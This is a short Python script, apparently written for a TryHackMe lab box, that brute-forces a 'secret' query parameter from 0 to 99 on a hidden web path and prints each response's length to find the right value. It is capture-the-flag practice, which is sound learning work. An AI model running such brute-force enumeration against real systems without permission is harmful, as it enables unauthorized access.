#!/usr/bin/env python3
"""
Quick brute-forcer for the 'secret' query parameter (0-99) on a THM box.
"""

import requests

BASE_URL = "http://10.81.160.157/th1s_1s_h1dd3n/"
TIMEOUT = 5

def main():
    session = requests.Session()

    for secret in range(0, 100):
        params = {"secret": secret}
        try:
            resp = session.get(BASE_URL, params=params, timeout=TIMEOUT)
        except requests.RequestException as e:
            print(f"[!] secret={secret} -> request failed: {e}")
            continue

        length = len(resp.content)
        print(f"secret={secret:<3} len={length}")

if __name__ == "__main__":
    main()
